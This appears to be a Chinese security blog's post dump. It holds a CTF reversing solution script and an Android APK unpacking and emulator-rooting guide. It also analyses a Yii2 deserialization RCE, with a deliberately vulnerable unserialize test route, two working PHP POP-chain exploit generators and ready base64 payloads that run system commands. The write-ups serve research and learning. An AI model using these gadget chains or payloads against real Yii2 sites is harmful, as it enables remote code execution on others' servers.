class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F8 </span><br><span class="line">F1 E4 <span class="number">0F</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E7 <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x0F], input[0x11] = input[0x11], input[0x0F]</span></span><br><span class="line">F4 <span class="comment">// ret</span></span><br></pre></td></tr></table></figure>

<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>直接逆向上面的操作就好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;69 45 2A 37 09 17 C5 0B 5C 72 33 76 33 21 74 31 5F 33 73 72&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">flag = [<span class="built_in">int</span>(_, <span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> flag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 置换</span></span><br><span class="line">flag[<span class="number">15</span>], flag[<span class="number">17</span>] = flag[<span class="number">17</span>], flag[<span class="number">15</span>]</span><br><span class="line">flag[<span class="number">14</span>], flag[<span class="number">18</span>] = flag[<span class="number">18</span>], flag[<span class="number">14</span>]</span><br><span class="line">flag[<span class="number">19</span>], flag[<span class="number">13</span>] = flag[<span class="number">13</span>], flag[<span class="number">19</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># z3</span></span><br><span class="line">a6, a7, a8 = BitVecs(<span class="string">&#x27;a6 a7 a8&#x27;</span>, <span class="number">8</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(flag[<span class="number">6</span>] == (a8 + <span class="number">2</span> * a7 + <span class="number">3</span> * a6) * flag[<span class="number">12</span>])</span><br><span class="line">s.add(flag[<span class="number">7</span>] == (flag[<span class="number">9</span>]  + <span class="number">2</span> * a8 + <span class="number">3</span> * a7) * flag[<span class="number">12</span>])</span><br><span class="line">s.add(flag[<span class="number">8</span>] == (flag[<span class="number">10</span>] + <span class="number">2</span> * flag[<span class="number">9</span>] + <span class="number">3</span> * a8) * flag[<span class="number">12</span>])</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        index = <span class="built_in">int</span>(re.search(<span class="string">r&#x27;\d+&#x27;</span>, <span class="built_in">str</span>(i)).group())</span><br><span class="line">        flag[index] = m[i].as_long()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 异或</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    flag[i] ^= flag[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] flag: &#x27;</span>, <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> flag]))</span><br><span class="line"><span class="comment"># [+] flag:  Y0u_hav3_r3v3rs3_1t!</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>Yii2最新反序列化POP链分析</title>
    <url>/2021/06/03/Yii2%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<blockquote>
<p>Yii2 &lt;&#x3D; 2.0.42</p>
<p>研究Yii2最新的反序列化RCE，并参考作者思路挖掘新的Gadget</p>
</blockquote>
<span id="more"></span>

<h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">composer create-project --prefer-dist yiisoft/yii2-app-basic yii2</span><br></pre></td></tr></table></figure>

<p>把目录放到网站下，访问<code>http://127.0.0.1/yii2/web</code>即可</p>
<p>然后在<code>controllers/SiteController.php</code>文件下添加我们的测试路由：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DefaultGenerator</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$default</span> ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$argv</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">default</span> = <span class="variable">$argv</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ValidGenerator</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$generator</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$validator</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$maxRetries</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$command</span>,<span class="variable">$argv</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;generator = <span class="keyword">new</span> <span class="title class_">DefaultGenerator</span>(<span class="variable">$argv</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;validator = <span class="variable">$command</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;maxRetries = <span class="number">99999999</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Faker</span>\<span class="title">ValidGenerator</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$processes</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$command</span>,<span class="variable">$argv</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;processes[] = <span class="keyword">new</span> <span class="title class_">ValidGenerator</span>(<span class="variable">$command</span>,<span class="variable">$argv</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title class_">RunProcess</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment"># TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6NDM6IgBDb2RlY2VwdGlvblxFeHRlbnNpb25cUnVuUHJvY2VzcwBwcm9jZXNzZXMiO2E6MTp7aTowO086MjA6IkZha2VyXFZhbGlkR2VuZXJhdG9yIjozOntzOjEyOiIAKgBnZW5lcmF0b3IiO086MjI6IkZha2VyXERlZmF1bHRHZW5lcmF0b3IiOjE6e3M6MTA6IgAqAGRlZmF1bHQiO3M6Njoid2hvYW1pIjt9czoxMjoiACoAdmFsaWRhdG9yIjtzOjY6InN5c3RlbSI7czoxMzoiACoAbWF4UmV0cmllcyI7aTo5OTk5OTk5OTt9fX0=</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021060322487929d10c56f7483236a4.png" alt="image-20210603224742097" style="zoom:67%;" />

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>入口点在<code>vendor/codeception/codeception/ext/RunProcess.php</code>的<code>__destruct</code>方法中，这个方法很早就有人用了，但是官方还没禁止其反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span> <span class="keyword">extends</span> <span class="title">Extension</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">stopProcess</span>(); <span class="comment">// 漏洞入口</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stopProcess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="title function_ invoke__">array_reverse</span>(<span class="variable language_">$this</span>-&gt;processes) <span class="keyword">as</span> <span class="variable">$process</span>) &#123;</span><br><span class="line">            <span class="comment">/** <span class="doctag">@var</span> $process Process  **/</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$process</span>-&gt;<span class="title function_ invoke__">isRunning</span>()) &#123; <span class="comment">// 不存在isRunning()方法，调用__call()方法</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;output-&gt;<span class="title function_ invoke__">debug</span>(<span class="string">&#x27;[RunProcess] Stopping &#x27;</span> . <span class="variable">$process</span>-&gt;<span class="title function_ invoke__">getCommandLine</span>());</span><br><span class="line">            <span class="variable">$process</span>-&gt;<span class="title function_ invoke__">stop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;processes = [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>触发<code>vendor/fakerphp/faker/src/Faker/ValidGenerator.php</code>的<code>__call()</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ValidGenerator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable language_">$this</span>-&gt;generator, <span class="variable">$name</span>], <span class="variable">$arguments</span>); <span class="comment">// $name为isRunning，$arguments为空，我们可以通过另一个类的__call()函数返回指定值</span></span><br><span class="line">            ++<span class="variable">$i</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$i</span> &gt; <span class="variable language_">$this</span>-&gt;maxRetries) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\OverflowException</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Maximum retries of %d reached without finding a valid value&#x27;</span>, <span class="variable language_">$this</span>-&gt;maxRetries));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (!<span class="title function_ invoke__">call_user_func</span>(<span class="variable language_">$this</span>-&gt;validator, <span class="variable">$res</span>)); <span class="comment">// 命令执行</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>上面的<code>call_user_func_array()</code>方法可以利用<code>vendor/fakerphp/faker/src/Faker/DefaultGenerator.php</code>中的<code>__call()</code>方法返回自定义值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DefaultGenerator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$attributes</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">default</span>; <span class="comment">// 传入需要执行的命令</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>Yii2的补丁大都是直接加一个<code>__wakeup()</code>方法抛出错误禁止反序列化，即黑名单过滤</p>
<p>跟着作者的思路，全局搜一下<code>__destruct()</code>方法，能用的基本就只剩下上面那个<code>RunProcess</code>类了</p>
<p>只能去搜一下<code>__call()</code>方法，然后发现了下面的<code>UniqueGenerator</code>类，和上面用到的<code>ValidGenerator</code>类很相似</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UniqueGenerator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;uniques[<span class="variable">$name</span>])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;uniques[<span class="variable">$name</span>] = [];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable language_">$this</span>-&gt;generator, <span class="variable">$name</span>], <span class="variable">$arguments</span>); <span class="comment">// $res可控</span></span><br><span class="line">            ++<span class="variable">$i</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$i</span> &gt; <span class="variable language_">$this</span>-&gt;maxRetries) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\OverflowException</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Maximum retries of %d reached without finding a unique value&#x27;</span>, <span class="variable language_">$this</span>-&gt;maxRetries));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>), <span class="variable language_">$this</span>-&gt;uniques[<span class="variable">$name</span>])); <span class="comment">// 调用了serialize()方法，可以触发__sleep()方法</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;uniques[<span class="variable">$name</span>][<span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>)] = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>搜索<code>__sleep()</code>方法，来到了熟悉的<code>LazyString</code>类，到这里的思路应该就是全局搜一下<code>call_user_func()</code>方法，看看有没有可控的触发函数，这里我们就直接使用去年就已经被挖出来的<code>LazyString Gadget</code>吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">String</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LazyString</span> <span class="keyword">implements</span> \<span class="title">Stringable</span>, \<span class="title">JsonSerializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__toString</span>(); <span class="comment">// 调用__toString()</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (\<span class="title function_ invoke__">is_string</span>(<span class="variable language_">$this</span>-&gt;value)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;value = (<span class="variable language_">$this</span>-&gt;value)(); <span class="comment">// 函数可控</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (\<span class="title class_">TypeError</span>::<span class="variable language_">class</span> === \<span class="title function_ invoke__">get_class</span>(<span class="variable">$e</span>) &amp;&amp; <span class="keyword">__FILE__</span> === <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getFile</span>()) &#123;</span><br><span class="line">                <span class="variable">$type</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">                <span class="variable">$type</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">array_pop</span>(<span class="variable">$type</span>), <span class="number">0</span>, -\<span class="title function_ invoke__">strlen</span>(<span class="string">&#x27; returned&#x27;</span>));</span><br><span class="line">                <span class="variable">$r</span> = <span class="keyword">new</span> <span class="title class_">\ReflectionFunction</span>(<span class="variable language_">$this</span>-&gt;value);</span><br><span class="line">                <span class="variable">$callback</span> = <span class="variable">$r</span>-&gt;<span class="title function_ invoke__">getStaticVariables</span>()[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="variable">$e</span> = <span class="keyword">new</span> <span class="title class_">\TypeError</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Return value of %s() passed to %s::fromCallable() must be of the type string, %s returned.&#x27;</span>, <span class="variable">$callback</span>, <span class="built_in">static</span>::<span class="variable language_">class</span>, <span class="variable">$type</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (\PHP_VERSION_ID &lt; <span class="number">70400</span>) &#123;</span><br><span class="line">                <span class="comment">// leverage the ErrorHandler component with graceful fallback when it&#x27;s not available</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">trigger_error</span>(<span class="variable">$e</span>, \E_USER_ERROR);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> <span class="variable">$e</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>给出最后的exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">IndexAction</span>&#123;</span><br><span class="line">        <span class="title class_">function</span> <span class="title class_">__construct</span>()</span><br><span class="line">        &#123;</span><br><span class="line">            $<span class="title class_">this</span>-&gt;<span class="title class_">checkAccess</span> = &#x27;<span class="title class_">system</span>&#x27;;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">String</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">IndexAction</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LazyString</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;value = [<span class="keyword">new</span> <span class="title class_">indexAction</span>(), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">UnicodeString</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;value = <span class="keyword">new</span> <span class="title class_">LazyString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">String</span>\<span class="title class_">LazyString</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DefaultGenerator</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="keyword">default</span> = <span class="keyword">new</span> <span class="title class_">LazyString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">UniqueGenerator</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;generator = <span class="keyword">new</span> <span class="title class_">DefaultGenerator</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;maxRetries = <span class="number">99999999</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">UniqueGenerator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;processes[] = <span class="keyword">new</span> <span class="title class_">UniqueGenerator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span>\<span class="title class_">RunProcess</span>;</span><br><span class="line">    <span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title class_">RunProcess</span>();</span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6OToicHJvY2Vzc2VzIjthOjE6e2k6MDtPOjIxOiJGYWtlclxVbmlxdWVHZW5lcmF0b3IiOjI6e3M6OToiZ2VuZXJhdG9yIjtPOjIyOiJGYWtlclxEZWZhdWx0R2VuZXJhdG9yIjoxOntzOjc6ImRlZmF1bHQiO086MzU6IlN5bWZvbnlcQ29tcG9uZW50XFN0cmluZ1xMYXp5U3RyaW5nIjoxOntzOjU6InZhbHVlIjthOjI6e2k6MDtPOjIwOiJ5aWlccmVzdFxJbmRleEFjdGlvbiI6Mjp7czoyOiJpZCI7czo2OiJ3aG9hbWkiO3M6MTE6ImNoZWNrQWNjZXNzIjtzOjY6InN5c3RlbSI7fWk6MTtzOjM6InJ1biI7fX19czoxMDoibWF4UmV0cmllcyI7aTo5OTk5OTk5OTt9fX0=</span></span><br></pre></td></tr></table></figure>



<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202106040200d261d2fda84de853a1e7.png" alt="image-20210604020055359" style="zoom:67%;" />







<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/9420">Yii2反序列化RCE 新POP链</a></p>
<p><a href="https://www.anquanke.com/post/id/217929">Yii反序列化分析</a></p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>bang-apk脱壳</title>
    <url>/2021/03/21/bang-apk%E8%84%B1%E5%A3%B3/</url>
    <content><![CDATA[<blockquote>
<p>题目源于【网鼎杯2020青龙组 bang】，主要考点为apk脱壳，题目使用梆梆安全加固</p>
</blockquote>
<p>记录一下如何使用<code>ApkShelling</code>脱壳</p>
<span id="more"></span>

<h3 id="安卓模拟器"><a href="#安卓模拟器" class="headerlink" title="安卓模拟器"></a>安卓模拟器</h3><p>我这里使用地是Android Studio创建安卓模拟器，当然你也可以直接下一个拥有root权限的安卓模拟器</p>
<p>镜像要求：</p>
<ul>
<li>Android 8.0（包含8.0）以下的镜像</li>
<li>镜像Google APIs</li>
<li>ABI为x86架构</li>
</ul>
<p>使用可写权限启动模拟器</p>
<blockquote>
<p>以后想要root的话也需要这样打开</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd xxx/android-sdk/tools</span><br><span class="line">emulator -list-avds</span><br><span class="line">emulator -avd Pixel_2_API_24 -writable-system</span><br></pre></td></tr></table></figure>

<h3 id="安装SuperSU"><a href="#安装SuperSU" class="headerlink" title="安装SuperSU"></a>安装SuperSU</h3><blockquote>
<p>SuperSU下载地址：<a href="https://supersuroot.org/download/">https://supersuroot.org/download/</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd xxx/android-sdk/platform-tools</span><br><span class="line">adb install supersu-2-82.apk</span><br></pre></td></tr></table></figure>

<h3 id="安装Xposed"><a href="#安装Xposed" class="headerlink" title="安装Xposed"></a>安装Xposed</h3><blockquote>
<p>Xposed下载地址：<a href="https://repo.xposed.info/module/de.robv.android.xposed.installer">https://repo.xposed.info/module/de.robv.android.xposed.installer</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd xxx/android-sdk/platform-tools</span><br><span class="line">adb install XposedInstaller_3.1.5.apk</span><br></pre></td></tr></table></figure>

<h3 id="Root模拟器"><a href="#Root模拟器" class="headerlink" title="Root模拟器"></a>Root模拟器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd xxx/android-sdk/platform-tools</span><br><span class="line">adb root</span><br><span class="line">adb remount</span><br><span class="line">adb shell </span><br><span class="line">setenforce 0</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>

<h3 id="上传配置文件"><a href="#上传配置文件" class="headerlink" title="上传配置文件"></a>上传配置文件</h3><blockquote>
<p>SupoerSu.zip下载地址：<a href="https://download.chainfire.eu/1220/SuperSU">https://download.chainfire.eu/1220/SuperSU</a></p>
</blockquote>
<p>把<code>SuperSu/x86/su.pie</code>上传到模拟器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb push su.pie /system/bin/su</span><br><span class="line">adb push su.pie /system/xbin/su</span><br></pre></td></tr></table></figure>

<p>进入adb shell修改文件权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">chmod 0755 /system/bin/su</span><br><span class="line">chmod 0755 /system/xbin/su</span><br><span class="line">su --install</span><br><span class="line">su --daemon&amp;</span><br></pre></td></tr></table></figure>

